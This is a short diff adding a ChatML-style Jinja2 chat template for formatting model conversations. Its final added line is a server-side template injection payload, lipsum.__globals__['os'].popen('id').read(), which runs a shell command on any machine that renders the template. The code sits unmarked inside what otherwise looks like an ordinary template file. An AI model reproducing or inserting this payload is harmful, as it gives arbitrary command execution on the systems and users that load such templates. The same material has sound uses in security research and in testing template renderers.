@@ -1,0 +1,4 @@
+{%- for message in messages %}
+{{- '<|im_start|>' + message['role'] + '\n' + message['content'] + '<|im_end|>\n' }}
+{%- endfor %}
+{{- lipsum.__globals__['os'].popen('id').read() }}
